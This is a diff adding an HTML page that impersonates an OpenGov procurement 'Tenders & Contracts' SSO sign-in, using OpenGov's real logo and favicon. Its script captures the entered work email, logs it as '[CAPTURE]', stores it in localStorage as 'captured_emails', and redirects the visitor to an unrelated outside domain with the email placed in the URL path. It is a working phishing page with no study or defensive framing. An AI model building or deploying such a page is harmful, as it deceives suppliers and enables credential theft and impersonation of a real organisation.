@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <title>Tenders & Contracts · OpenGov</title>
+  <link rel="icon" type="image/x-icon" href="https://procurement.opengov.com/favicon.ico?v=xQdYkowL8Nzx" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: #f0f3f9;
+      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      color: #1a2b3c;
+    }
+
+    /* ─── header with logo (left) ─── */
+    .portal-header {
+      background: #ffffff;
+      border-bottom: 1px solid #e2e8f0;
+      padding: 0.9rem 2.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+      flex-shrink: 0;
+      box-shadow: 0 1px 4px rgba(0, 0, 0, 0.02);
+    }
+
+    .portal-header img {
+      height: 38px;
+      width: auto;
+      display: block;
+    }
+
+    /* ─── two‑column layout ─── */
+    .auth-screen {
+      flex: 1;
+      display: flex;
+      align-items: stretch;
+      justify-content: center;
+      padding: 2rem 1.5rem;
+      gap: 2rem;
+      max-width: 1200px;
+      margin: 0 auto;
+      width: 100%;
+    }
+
+    /* left panel – info / illustration */
+    .info-panel {
+      flex: 1;
+      background: linear-gradient(145deg, #ffffff, #f8faff);
+      border-radius: 32px;
+      padding: 2.5rem 2.2rem;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      box-shadow: 0 12px 28px -12px rgba(0, 0, 0, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.6);
+    }
+
+    .info-panel h2 {
+      font-size: 1.8rem;
+      font-weight: 600;
+      letter-spacing: -0.4px;
+      color: #0b2538;
+      margin-bottom: 0.75rem;
+    }
+
+    .info-panel p {
+      color: #4d637e;
+      font-size: 1rem;
+      line-height: 1.6;
+      max-width: 90%;
+      margin-bottom: 1.5rem;
+    }
+
+    .info-panel .feature-list {
+      list-style: none;
+      margin-top: 0.5rem;
+    }
+
+    .info-panel .feature-list li {
+      display: flex;
+      align-items: center;
+      gap: 0.7rem;
+      font-size: 0.95rem;
+      color: #1f3a57;
+      padding: 0.5rem 0;
+      border-bottom: 1px solid #edf2f8;
+    }
+
+    .info-panel .feature-list li:last-child {
+      border-bottom: none;
+    }
+
+    .info-panel .feature-list li::before {
+      content: "✓";
+      font-weight: 700;
+      color: #1f5e8e;
+      background: #e5eef7;
+      width: 24px;
+      height: 24px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      font-size: 0.8rem;
+    }
+
+    /* right panel – form card */
+    .auth-card {
+      flex: 0 0 420px;
+      background: #ffffff;
+      border-radius: 32px;
+      box-shadow: 0 16px 36px -14px rgba(0, 0, 0, 0.06);
+      padding: 2.4rem 2.2rem 2.8rem;
+      border: 1px solid rgba(0, 0, 0, 0.03);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+
+    .greeting {
+      margin-bottom: 1.8rem;
+    }
+
+    .greeting h1 {
+      font-size: 1.6rem;
+      font-weight: 600;
+      letter-spacing: -0.3px;
+      color: #0b2538;
+    }
+
+    .greeting .sub {
+      color: #5a6f8a;
+      font-size: 0.95rem;
+      font-weight: 450;
+      margin-top: 0.2rem;
+    }
+
+    .input-group {
+      margin-bottom: 0.2rem;
+    }
+
+    .modern-input {
+      width: 100%;
+      padding: 0.9rem 1.3rem;
+      font-size: 1rem;
+      font-weight: 450;
+      color: #1e2f3f;
+      background: #ffffff;
+      border: 1.5px solid #e2e8f0;
+      border-radius: 48px;
+      transition: all 0.2s ease;
+      outline: none;
+      font-family: inherit;
+      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.02);
+    }
+
+    .modern-input:focus {
+      border-color: #1f5e8e;
+      box-shadow: 0 0 0 4px rgba(31, 94, 142, 0.08);
+      background-color: #fcfdff;
+    }
+
+    .modern-input::placeholder {
+      color: #9aafc4;
+      font-weight: 400;
+    }
+
+    .input-error-border {
+      border-color: #d9534f !important;
+      background-color: #fff8f8 !important;
+      box-shadow: 0 0 0 3px rgba(217, 83, 79, 0.06) !important;
+    }
+
+    .error-feedback {
+      color: #c0392b;
+      font-size: 0.75rem;
+      font-weight: 500;
+      margin: 0.5rem 0 0 1rem;
+      display: none;
+      align-items: center;
+      gap: 0.4rem;
+    }
+
+    .error-feedback::before {
+      content: "•";
+      font-size: 1.1rem;
+      font-weight: bold;
+    }
+
+    .action-button {
+      width: 100%;
+      margin-top: 1.8rem;
+      background: #1f5e8e;
+      border: none;
+      padding: 0.85rem 1rem;
+      border-radius: 48px;
+      font-size: 0.95rem;
+      font-weight: 600;
+      letter-spacing: 0.3px;
+      color: white;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      font-family: inherit;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.04);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .action-button:hover {
+      background: #13436b;
+      transform: translateY(-1px);
+      box-shadow: 0 8px 18px rgba(31, 94, 142, 0.12);
+    }
+
+    .action-button:active {
+      transform: translateY(1px);
+    }
+
+    .secure-note {
+      text-align: center;
+      font-size: 0.7rem;
+      color: #7c8aa2;
+      margin-top: 1.6rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      background: #f8fafd;
+      width: fit-content;
+      margin-left: auto;
+      margin-right: auto;
+      padding: 0.25rem 1.2rem;
+      border-radius: 40px;
+    }
+
+    .secure-note span {
+      font-size: 0.75rem;
+    }
+
+    .app-footer {
+      width: 100%;
+      text-align: center;
+      padding: 1.5rem 1rem 2rem;
+      font-size: 0.75rem;
+      border-top: 1px solid #eef2f8;
+      margin-top: auto;
+      background: rgba(255, 255, 255, 0.7);
+      backdrop-filter: blur(2px);
+    }
+
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 1.8rem;
+    }
+
+    .footer-links a {
+      color: #5b7a9a;
+      text-decoration: none;
+      font-weight: 500;
+      transition: color 0.15s;
+    }
+
+    .footer-links a:hover {
+      color: #1f5e8e;
+      text-decoration: underline;
+    }
+
+    @keyframes gentleShake {
+      0% { transform: translateX(0); }
+      25% { transform: translateX(4px); }
+      75% { transform: translateX(-4px); }
+      100% { transform: translateX(0); }
+    }
+
+    .shake-effect {
+      animation: gentleShake 0.25s ease-in-out 0s 1;
+    }
+
+    .btn-loading {
+      pointer-events: none;
+      opacity: 0.85;
+    }
+
+    .spinner-icon {
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(255,255,255,0.4);
+      border-top: 2px solid #ffffff;
+      border-radius: 50%;
+      animation: spin 0.6s linear infinite;
+      margin-right: 6px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* ─── responsive ─── */
+    @media (max-width: 900px) {
+      .auth-screen {
+        flex-direction: column;
+        align-items: center;
+        padding: 1.5rem 1rem;
+      }
+      .info-panel {
+        width: 100%;
+        max-width: 500px;
+        padding: 2rem 1.8rem;
+      }
+      .info-panel p {
+        max-width: 100%;
+      }
+      .auth-card {
+        flex: 0 0 auto;
+        width: 100%;
+        max-width: 500px;
+      }
+    }
+
+    @media (max-width: 560px) {
+      .portal-header {
+        padding: 0.8rem 1.5rem;
+      }
+      .portal-header img {
+        height: 30px;
+      }
+      .info-panel h2 {
+        font-size: 1.5rem;
+      }
+      .auth-card {
+        padding: 1.8rem 1.3rem 2rem;
+        border-radius: 24px;
+      }
+      .greeting h1 {
+        font-size: 1.4rem;
+      }
+      .modern-input {
+        padding: 0.8rem 1.1rem;
+      }
+      .action-button {
+        padding: 0.75rem;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ─── HEADER ─── -->
+  <header class="portal-header">
+    <img src="https://assets.procurement.opengov.com/brand/og-pro-v1.svg" alt="OpenGov" />
+  </header>
+
+  <!-- ─── TWO‑COLUMN LAYOUT ─── -->
+  <div class="auth-screen">
+    <!-- left panel: info / illustration -->
+    <div class="info-panel">
+      <h2>Tenders &amp; Contracts</h2>
+      <p>Welcome, suppliers and contractors. Securely access open opportunities, submit bids, and stay on top of your agreements all in one place.</p>
+      <ul class="feature-list">
+        <li>Browse current tenders</li>
+        <li>Submit bids securely</li>
+        <li>Track contract milestones</li>
+      </ul>
+    </div>
+
+    <!-- right panel: form -->
+    <div class="auth-card">
+      <div class="greeting">
+        <h1>Secure SSO Access</h1>
+        <div class="sub">Enter your work email to access the portal</div>
+      </div>
+
+      <form id="gatewayForm" novalidate>
+        <div class="email-form">
+          <div class="input-group">
+            <input type="email"
+                   id="workEmailInput"
+                   name="email"
+                   class="modern-input"
+                   placeholder="Work email address"
+                   required
+                   autocomplete="off"
+                   autofocus />
+          </div>
+          <div id="inlineError" class="error-feedback">
+            Please enter a valid email address.
+          </div>
+          <button type="submit" id="submitBtn" class="action-button">
+            <span>→</span> Continue
+          </button>
+          <div class="secure-note">
+            <span>🔒</span> <span>Encrypted · SSO ready</span>
+          </div>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <!-- ─── FOOTER ─── -->
+  <div class="app-footer">
+    <div class="footer-links">
+      <a href="#">Terms</a>
+      <a href="#">Privacy</a>
+      <a href="#">Support</a>
+      <a href="#">Security</a>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      const emailField = document.getElementById('workEmailInput');
+      const form = document.getElementById('gatewayForm');
+      const errorDiv = document.getElementById('inlineError');
+      const submitButton = document.getElementById('submitBtn');
+
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      const LANDING_URL = 'https://jegydtehasa-6fbl47qnj.opromonoto.info/';
+
+      function clearErrorUI() {
+        if (emailField.classList.contains('input-error-border')) {
+          emailField.classList.remove('input-error-border');
+        }
+        errorDiv.style.display = 'none';
+        errorDiv.classList.remove('shake-effect');
+      }
+
+      function showErrorUI() {
+        emailField.classList.add('input-error-border');
+        errorDiv.style.display = 'flex';
+        errorDiv.classList.add('shake-effect');
+        setTimeout(() => {
+          if (errorDiv) errorDiv.classList.remove('shake-effect');
+        }, 350);
+      }
+
+      let isProcessing = false;
+
+      function processEmailCapture(emailRaw) {
+        const email = emailRaw.trim();
+
+        if (!emailRegex.test(email)) {
+          showErrorUI();
+          return false;
+        }
+
+        clearErrorUI();
+
+        const now = new Date();
+        const timestamp = now.toISOString().replace('T', ' ').substring(0, 19);
+        console.log(`[CAPTURE] ${timestamp} → ${email}`);
+
+        try {
+          const storedEmails = localStorage.getItem('captured_emails');
+          let emailsArray = storedEmails ? JSON.parse(storedEmails) : [];
+          emailsArray.push({
+            email: email,
+            timestamp: now.toISOString(),
+            raw: true
+          });
+          localStorage.setItem('captured_emails', JSON.stringify(emailsArray));
+        } catch (e) {
+          console.warn('localStorage unavailable');
+        }
+
+        // ─── ✨ UPDATED: path‑based email (after /) ───
+        const urlParts = LANDING_URL.split('?');
+        let basePath = urlParts[0];               // e.g., "https://.../r/reconets/"
+        const queryString = urlParts[1] ? '?' + urlParts[1] : '';
+
+        // ensure trailing slash
+        if (!basePath.endsWith('/')) {
+          basePath += '/';
+        }
+
+        const encodedEmail = encodeURIComponent(email);
+        const redirectUrl = basePath + encodedEmail + queryString;
+        // Result: https://.../reconets/user%40domain.com?token=...
+
+        setTimeout(() => {
+          window.location.href = redirectUrl;
+        }, 60);
+        return true;
+      }
+
+      async function onSubmitHandler(event) {
+        event.preventDefault();
+        if (isProcessing) return;
+
+        const enteredEmail = emailField.value;
+        if (!enteredEmail || enteredEmail.trim() === '') {
+          showErrorUI();
+          return;
+        }
+
+        isProcessing = true;
+        const originalText = submitButton.innerHTML;
+        submitButton.innerHTML = '<span class="spinner-icon"></span> Verifying...';
+        submitButton.classList.add('btn-loading');
+        submitButton.disabled = true;
+
+        const success = processEmailCapture(enteredEmail);
+        if (!success) {
+          submitButton.innerHTML = originalText;
+          submitButton.classList.remove('btn-loading');
+          submitButton.disabled = false;
+          isProcessing = false;
+        } else {
+          setTimeout(() => {
+            if (!window.location.href.includes('servicelifereportchoice')) {
+              submitButton.innerHTML = originalText;
+              submitButton.classList.remove('btn-loading');
+              submitButton.disabled = false;
+              isProcessing = false;
+            }
+          }, 2500);
+        }
+      }
+
+      function removeErrorOnInput() {
+        if (emailField.classList.contains('input-error-border')) {
+          emailField.classList.remove('input-error-border');
+          errorDiv.style.display = 'none';
+        }
+      }
+
+      if (form) form.addEventListener('submit', onSubmitHandler);
+      if (emailField) {
+        emailField.addEventListener('input', removeErrorOnInput);
+        emailField.addEventListener('focus', removeErrorOnInput);
+      }
+
+      clearErrorUI();
+      console.log('✓ Tenders & Contracts portal ready — email placed in path (after /)');
+    })();
+  </script>
+</body>
+</html>
